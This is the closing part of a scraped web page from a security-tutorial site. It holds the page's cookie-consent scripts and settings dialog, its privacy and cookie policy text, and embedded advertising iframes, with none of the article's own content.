<script type="text/javascript" id="moove_gdpr_frontend-js-extra">
/* <![CDATA[ */
var moove_frontend_gdpr_scripts = {"ajaxurl":"https:\/\/www.corelan.be\/wp-admin\/admin-ajax.php","post_id":"2146","plugin_dir":"https:\/\/www.corelan.be\/wp-content\/plugins\/gdpr-cookie-compliance","show_icons":"all","is_page":"","ajax_cookie_removal":"false","strict_init":"1","enabled_default":{"third_party":0,"advanced":0},"geo_location":"false","force_reload":"false","is_single":"1","hide_save_btn":"false","current_user":"0","cookie_expiration":"365","script_delay":"2000","close_btn_action":"1","close_btn_rdr":"","scripts_defined":"{\"cache\":true,\"header\":\"\",\"body\":\"\",\"footer\":\"\",\"thirdparty\":{\"header\":\"\",\"body\":\"\",\"footer\":\"\"},\"advanced\":{\"header\":\"\",\"body\":\"\",\"footer\":\"\"}}","gdpr_scor":"true","wp_lang":"","wp_consent_api":"false"};
/* ]]> */
</script>
<script defer="" type="text/javascript" src="https://www.corelan.be/wp-content/plugins/gdpr-cookie-compliance/dist/scripts/main.js?ver=4.15.1" id="moove_gdpr_frontend-js"></script>
<script defer="" type="text/javascript" id="moove_gdpr_frontend-js-after">
/* <![CDATA[ */
var gdpr_consent__strict = "false"
var gdpr_consent__thirdparty = "false"
var gdpr_consent__advanced = "false"
var gdpr_consent__cookies = ""
/* ]]> */
</script>
<script type="text/javascript" id="stbClient-js-extra">
/* <![CDATA[ */
var stbUserOptions = {"restData":{"root":"https:\/\/www.corelan.be\/index.php\/wp-json\/","nonce":"d6c2727ce3"}};
/* ]]> */
</script>
<script defer="" type="text/javascript" src="https://www.corelan.be/wp-content/plugins/wp-special-textboxes/js/client.js?ver=6.2.2" id="stbClient-js"></script>

  <!--copyscapeskip-->
  <button data-href="#moove_gdpr_cookie_modal" id="moove_gdpr_save_popup_settings_button" style="display: none;" class="" aria-label="Change cookie settings">
    <span class="moove_gdpr_icon">
      <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" style="max-width: 30px; max-height: 30px;">
        <g data-name="1">
          <path d="M293.9,450H233.53a15,15,0,0,1-14.92-13.42l-4.47-42.09a152.77,152.77,0,0,1-18.25-7.56L163,413.53a15,15,0,0,1-20-1.06l-42.69-42.69a15,15,0,0,1-1.06-20l26.61-32.93a152.15,152.15,0,0,1-7.57-18.25L76.13,294.1a15,15,0,0,1-13.42-14.91V218.81A15,15,0,0,1,76.13,203.9l42.09-4.47a152.15,152.15,0,0,1,7.57-18.25L99.18,148.25a15,15,0,0,1,1.06-20l42.69-42.69a15,15,0,0,1,20-1.06l32.93,26.6a152.77,152.77,0,0,1,18.25-7.56l4.47-42.09A15,15,0,0,1,233.53,48H293.9a15,15,0,0,1,14.92,13.42l4.46,42.09a152.91,152.91,0,0,1,18.26,7.56l32.92-26.6a15,15,0,0,1,20,1.06l42.69,42.69a15,15,0,0,1,1.06,20l-26.61,32.93a153.8,153.8,0,0,1,7.57,18.25l42.09,4.47a15,15,0,0,1,13.41,14.91v60.38A15,15,0,0,1,451.3,294.1l-42.09,4.47a153.8,153.8,0,0,1-7.57,18.25l26.61,32.93a15,15,0,0,1-1.06,20L384.5,412.47a15,15,0,0,1-20,1.06l-32.92-26.6a152.91,152.91,0,0,1-18.26,7.56l-4.46,42.09A15,15,0,0,1,293.9,450ZM247,420h33.39l4.09-38.56a15,15,0,0,1,11.06-12.91A123,123,0,0,0,325.7,356a15,15,0,0,1,17,1.31l30.16,24.37,23.61-23.61L372.06,328a15,15,0,0,1-1.31-17,122.63,122.63,0,0,0,12.49-30.14,15,15,0,0,1,12.92-11.06l38.55-4.1V232.31l-38.55-4.1a15,15,0,0,1-12.92-11.06A122.63,122.63,0,0,0,370.75,187a15,15,0,0,1,1.31-17l24.37-30.16-23.61-23.61-30.16,24.37a15,15,0,0,1-17,1.31,123,123,0,0,0-30.14-12.49,15,15,0,0,1-11.06-12.91L280.41,78H247l-4.09,38.56a15,15,0,0,1-11.07,12.91A122.79,122.79,0,0,0,201.73,142a15,15,0,0,1-17-1.31L154.6,116.28,131,139.89l24.38,30.16a15,15,0,0,1,1.3,17,123.41,123.41,0,0,0-12.49,30.14,15,15,0,0,1-12.91,11.06l-38.56,4.1v33.38l38.56,4.1a15,15,0,0,1,12.91,11.06A123.41,123.41,0,0,0,156.67,311a15,15,0,0,1-1.3,17L131,358.11l23.61,23.61,30.17-24.37a15,15,0,0,1,17-1.31,122.79,122.79,0,0,0,30.13,12.49,15,15,0,0,1,11.07,12.91ZM449.71,279.19h0Z" fill="currentColor"></path>
          <path d="M263.71,340.36A91.36,91.36,0,1,1,355.08,249,91.46,91.46,0,0,1,263.71,340.36Zm0-152.72A61.36,61.36,0,1,0,325.08,249,61.43,61.43,0,0,0,263.71,187.64Z" fill="currentColor"></path>
        </g>
      </svg>
    </span>

    <span class="moove_gdpr_text">Change cookie settings</span>
  </button>
  <!--/copyscapeskip-->
    
  <!--copyscapeskip-->
  <!-- V1 -->
  <div id="moove_gdpr_cookie_modal" class="gdpr_lightbox-hide" role="complementary" aria-label="GDPR Settings Screen">
    <div class="moove-gdpr-modal-content moove-clearfix logo-position-left moove_gdpr_modal_theme_v1">
          
        <button class="moove-gdpr-modal-close" aria-label="Close GDPR Cookie Settings">
          <span class="gdpr-sr-only">Close GDPR Cookie Settings</span>
          <span class="gdpr-icon moovegdpr-arrow-close"></span>
        </button>
            <div class="moove-gdpr-modal-left-content">
        
<div class="moove-gdpr-company-logo-holder">
  <img src="https://www.corelan.be/wp-content/uploads/2018/06/corelan-gcv-small-300x294.jpg" alt="" width="300" height="294" class="img-responsive">
</div>
<!--  .moove-gdpr-company-logo-holder -->        <ul id="moove-gdpr-menu">
          
<li class="menu-item-on menu-item-privacy_overview menu-item-selected">
  <button data-href="#privacy_overview" class="moove-gdpr-tab-nav" aria-label="Privacy Overview">
    <span class="gdpr-nav-tab-title">Privacy Overview</span>
  </button>
</li>

  <li class="menu-item-strict-necessary-cookies menu-item-off">
    <button data-href="#strict-necessary-cookies" class="moove-gdpr-tab-nav" aria-label="Strictly Necessary Cookies">
      <span class="gdpr-nav-tab-title">Strictly Necessary Cookies</span>
    </button>
  </li>




  <li class="menu-item-moreinfo menu-item-off">
    <button data-href="#cookie_policy_modal" class="moove-gdpr-tab-nav" aria-label="Cookie Policy">
      <span class="gdpr-nav-tab-title">Cookie Policy</span>
    </button>
  </li>
        </ul>
        
<div class="moove-gdpr-branding-cnt">
  </div>
<!--  .moove-gdpr-branding -->      </div>
      <!--  .moove-gdpr-modal-left-content -->
      <div class="moove-gdpr-modal-right-content">
        <div class="moove-gdpr-modal-title">
           
        </div>
        <!-- .moove-gdpr-modal-ritle -->
        <div class="main-modal-content">

          <div class="moove-gdpr-tab-content">
            
<div id="privacy_overview" class="moove-gdpr-tab-main">
      <span class="tab-title">Privacy Overview</span>
    <div class="moove-gdpr-tab-main-content">
  	<p>a. Corelan respects your privacy. Most information accessible on or via the<br>
Corelan Website is available without the need to provide personal information.<br>
In certain cases you may however be requested to submit personal information. In<br>
such case your personal information shall be treated in accordance with the General Data Protection Regulation and any amendments hereof.</p>
<p>b. All personal information made available by you will be treated solely for<br>
the purpose of making available to you the requested information or services.<br>
Your personal information will not be shared with third parties, but it may be used for authentication, support &amp; marketing purposes in relation with services provided by Corelan.</p>
<p>c. We will only keep your personal information for as long as is required to<br>
provide you with the requested information or services, or for any longer period<br>
as may legally be required.</p>
<p>d. It is our goal to reasonably protect the personal information made<br>
available by you from third parties.</p>
<p>e. You have the right to consult, correct, adjust or have removed your<br>
personal details by written request to Corelan. &nbsp;If you decide to get your information removed, you understand and accept that you will lose all access to any resources that require the use of these personal details, such as parts of the website that require authentication.</p>
<p>f. When using the Corelan Website, cookies may possible be used. You do not have to accept cookies to be able to use the publicly accessible parts of Corelan Websites.&nbsp;If you have an account and you log in to this site, we will set a temporary cookie to determine if your browser accepts cookies. This cookie contains no personal data and is discarded when you close your browser.</p>
<p>When you log in, we will also set up several cookies to save your login information and your screen display choices.&nbsp; &nbsp;Cookies may be used to display advertisements or to collect statistics about the use of the Corelan website.</p>
<p>g. This privacy policy may be amended by Corelan at any time.</p>
  	  </div>
  <!--  .moove-gdpr-tab-main-content -->

</div>
<!-- #privacy_overview -->            
  <div id="strict-necessary-cookies" class="moove-gdpr-tab-main" style="display:none">
    <span class="tab-title">Strictly Necessary Cookies</span>
    <div class="moove-gdpr-tab-main-content">
      <p>Strictly Necessary Cookie should be enabled at all times so that we can save your preferences for cookie settings.</p>
      <div class="moove-gdpr-status-bar ">
        <div class="gdpr-cc-form-wrap">
          <div class="gdpr-cc-form-fieldset">
            <label class="cookie-switch" for="moove_gdpr_strict_cookies">    
              <span class="gdpr-sr-only">Enable or Disable Cookies</span>        
              <input type="checkbox" aria-label="Strictly Necessary Cookies" value="check" name="moove_gdpr_strict_cookies" id="moove_gdpr_strict_cookies">
              <span class="cookie-slider cookie-round" data-text-enable="Enabled" data-text-disabled="Disabled"></span>
            </label>
          </div>
          <!-- .gdpr-cc-form-fieldset -->
        </div>
        <!-- .gdpr-cc-form-wrap -->
      </div>
      <!-- .moove-gdpr-status-bar -->
              <div class="moove-gdpr-strict-warning-message" style="margin-top: 10px;">
          <p>If you disable this cookie, we will not be able to save your preferences. This means that every time you visit this website you will need to enable or disable cookies again.</p>
        </div>
        <!--  .moove-gdpr-tab-main-content -->
                                              
    </div>
    <!--  .moove-gdpr-tab-main-content -->
  </div>
  <!-- #strict-necesarry-cookies -->
            
            
            
  <div id="cookie_policy_modal" class="moove-gdpr-tab-main" style="display:none">
    <span class="tab-title">Cookie Policy</span>
    <div class="moove-gdpr-tab-main-content">
      <p>When using the Corelan Website, cookies may possibly be used. You do not have to accept cookies to be able to use the publicly accessible parts of the Corelan Website.&nbsp;If you have an account and you log in to this site, we will set a temporary cookie to determine if your browser accepts cookies. This cookie contains no personal data and is discarded when you close your browser. When you log in, we will also set up several cookies to save your login information and your screen display choices.</p>
<p>We may use third party cookies to show ads and to collect anonymous information such as the number of visitors to the site, and the most popular pages.&nbsp; The ability to show ads is an important source of income to cover the hosting fees to keep this website alive. If you prevent ads from being displayed, this website will eventually disappear.<br>
Third party vendors, including Google, use cookies to serve ads based on a user's prior visits to this website or other websites.<br>
Google's use of advertising cookies enables it and its partners to serve ads to your users based on their visit to this site and/or other sites on the Internet.</p>
       
    </div>
    <!--  .moove-gdpr-tab-main-content -->
  </div>
          </div>
          <!--  .moove-gdpr-tab-content -->
        </div>
        <!--  .main-modal-content -->
        <div class="moove-gdpr-modal-footer-content">
          <div class="moove-gdpr-button-holder">
			  		<button class="mgbutton moove-gdpr-modal-allow-all button-visible" aria-label="Enable All">Enable All</button>
		  					<button class="mgbutton moove-gdpr-modal-save-settings button-visible" aria-label="Save Changes">Save Changes</button>
				</div>
<!--  .moove-gdpr-button-holder -->        </div>
        <!--  .moove-gdpr-modal-footer-content -->
      </div>
      <!--  .moove-gdpr-modal-right-content -->

      <div class="moove-clearfix"></div>

    </div>
    <!--  .moove-gdpr-modal-content -->
  </div>
  <!-- #moove_gdpr_cookie_modal -->
  <!--/copyscapeskip-->
	        <!-- 190 queries. 0.687 seconds. -->
    </div>



<ins class="adsbygoogle adsbygoogle-noablate" style="display: none !important;" data-adsbygoogle-status="done"><div id="aswift_0_host" style="border: medium; height: 0px; width: 0px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-block;"><iframe id="aswift_0" name="aswift_0" style="left:0;position:absolute;top:0;border:0;width:undefinedpx;height:undefinedpx;" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://pagead2.googlesyndication.com/pagead/ads?ltd_cs=1&amp;client=ca-pub-8134501503628637&amp;output=html&amp;adk=1812271804&amp;adf=3025194257&amp;abgtt=6&amp;lmt=1718453408&amp;plat=3%3A16%2C9%3A134250504%2C16%3A8388608%2C17%3A32%2C24%3A32%2C25%3A32%2C30%3A1081344%2C32%3A32%2C41%3A32%2C42%3A32&amp;plas=135x624_r&amp;format=0x0&amp;url=https%3A%2F%2Fwww.corelan.be%2Findex.php%2F2009%2F07%2F23%2Fwriting-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2%2F&amp;host=ca-host-pub-2644536267352236&amp;pra=5&amp;wgl=1&amp;easpi=0&amp;aihb=0&amp;asro=0&amp;ailel=32~28~30~29~1~2~4~6~7~8~9~10~11~12~13~14~15~16~17~18~19~20~21~24&amp;aiael=32~28~30~29~1~2~4~6~7~8~9~10~11~12~13~14~15~16~17~18~19~20~21~24&amp;aifxl=32_7~28_13~30_19~29_11&amp;aiixl=32_9~28_4~30_6~29_5&amp;aslmct=0.7&amp;asamct=0.7&amp;itsi=-1&amp;dt=1718453408125&amp;bpp=2&amp;bdt=1193&amp;idt=193&amp;shv=r20240612&amp;mjsv=m202406110101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;eoidce=1&amp;nras=1&amp;correlator=7719720412199&amp;frm=20&amp;pv=2&amp;ga_vid=894080777.1718453408&amp;ga_sid=1718453408&amp;ga_hid=595021088&amp;ga_fc=0&amp;u_tz=120&amp;u_his=50&amp;u_h=864&amp;u_w=1536&amp;u_ah=864&amp;u_aw=1536&amp;u_cd=24&amp;u_sd=1.25&amp;adx=-12245933&amp;ady=-12245933&amp;biw=1280&amp;bih=693&amp;scr_x=0&amp;scr_y=0&amp;eid=44759876%2C44759927%2C44759842%2C42531705%2C42532524%2C44795921%2C95334510%2C95334524%2C95334573%2C95334581%2C95334819%2C95334830%2C95334054%2C95335290&amp;oid=2&amp;pvsid=1478390302474109&amp;tmod=1693119972&amp;uas=0&amp;nvt=1&amp;fsapi=1&amp;fc=1920&amp;brdim=-25600%2C-25600%2C-25600%2C-25600%2C1536%2C0%2C159%2C27%2C1280%2C692&amp;vis=2&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=32768&amp;bc=31&amp;bz=0.12&amp;ifi=1&amp;uci=a!1&amp;fsb=1&amp;dtd=224" data-google-container-id="a!1" tabindex="0" title="Advertisement" aria-label="Advertisement" data-load-complete="true"></iframe></div></ins><ins class="adsbygoogle adsbygoogle-noablate" style="display: none !important;" data-adsbygoogle-status="done"></ins><ins class="adsbygoogle adsbygoogle-noablate" style="display: none !important;" data-adsbygoogle-status="done"></ins><ins class="adsbygoogle adsbygoogle-noablate" data-adsbygoogle-status="done"><div id="aswift_3_host" style="border: medium; height: 600px; width: 120px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-block;"></div></ins><ins class="adsbygoogle adsbygoogle-noablate" data-adsbygoogle-status="done"><div id="aswift_4_host" style="border: medium; height: 124px; width: 1005px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-block;"></div></ins><iframe src="https://tpc.googlesyndication.com/sodar/sodar2/225/runner.html" width="0" height="0" style="display: none;"></iframe></body><iframe id="google_esf" name="google_esf" src="https://pagead2.googlesyndication.com/pagead/html/r20240612/r20110914/zrt_lookup_fy2021.html" style="display: none;"></iframe><ins class="adsbygoogle adsbygoogle-noablate" style="display: none !important; width: 100vw !important; height: 100vh !important; inset: 0px auto auto 0px !important; clear: none !important; float: none !important; margin: 0px !important; max-height: none !important; max-width: none !important; opacity: 1 !important; overflow: visible !important; padding: 0px !important; position: fixed !important; vertical-align: baseline !important; visibility: visible !important; z-index: 2147483647 !important; background: transparent !important;" data-adsbygoogle-status="done" aria-hidden="true" data-ad-status="filled" data-vignette-loaded="true"><div id="aswift_2_host" style="border: medium !important; height: 100vh !important; width: 100vw !important; margin: 0px !important; padding: 0px !important; position: relative !important; visibility: visible !important; background-color: transparent !important; display: inline-block !important; inset: auto !important; clear: none !important; float: none !important; max-height: none !important; max-width: none !important; opacity: 1 !important; overflow: visible !important; vertical-align: baseline !important; z-index: auto !important;"><iframe id="aswift_2" name="aswift_2" style="width: 100vw !important; height: 100vh !important; inset: 0px auto auto 0px !important; position: absolute !important; clear: none !important; display: inline !important; float: none !important; margin: 0px !important; max-height: none !important; max-width: none !important; opacity: 1 !important; overflow: visible !important; padding: 0px !important; vertical-align: baseline !important; visibility: visible !important; z-index: auto !important;" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="" height="" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://pagead2.googlesyndication.com/pagead/html/r20240612/r20110914/zrt_lookup_fy2021.html#RS-0-&amp;adk=1812271808&amp;client=ca-pub-8134501503628637&amp;fa=8&amp;ifi=3&amp;uci=a!3" data-google-container-id="a!3" tabindex="0" title="Advertisement" aria-label="Advertisement" data-google-query-id="CMmusOfJ3YYDFdLDuwgdil4CyA" data-load-complete="true"></iframe></div></ins></html>